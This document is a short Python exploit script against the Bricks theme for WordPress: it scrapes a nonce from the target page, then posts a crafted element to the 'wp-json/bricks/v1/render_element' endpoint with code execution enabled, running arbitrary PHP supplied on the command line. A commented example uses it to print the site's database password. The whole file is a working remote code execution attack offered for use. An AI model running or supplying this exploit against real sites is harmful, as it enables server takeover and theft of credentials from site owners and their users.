#!/usr/bin/python3
from bs4 import BeautifulSoup
import re
import requests
import sys

# You can change this
#host="https://vuln.t4k.io/"
host = sys.argv[1]
#evil_cmd='<?php echo "hello world"; ?>'
#evil_cmd='<?php echo "wp db pass:" . DB_PASSWORD; ?>'
evil_cmd=sys.argv[2]

def get_nonce(host):
    html_data = requests.get(host)

    soup = BeautifulSoup(html_data.text, 'html.parser')
    bricks_js = soup.find(id='bricks-scripts-js-extra')

    nonce = re.search('nonce":"(.*?)",', str(bricks_js))

    return nonce.group(1)

nonce=get_nonce(host)

path="wp-json/bricks/v1/render_element"
url=host+path
evil_obj = {
    'nonce': nonce,
    'postId': '1234',
    'action': 'bricks_render_element',
    'element': {
        'id': 'ahavrd',
        'name': 'code',
        'settings': {
            'code': evil_cmd,
            'executeCode': True
        }
    }
}

print("Attacking: ", host)
print("With nonnce: ", nonce)

res = requests.post(url, json=evil_obj)
print(res.text)
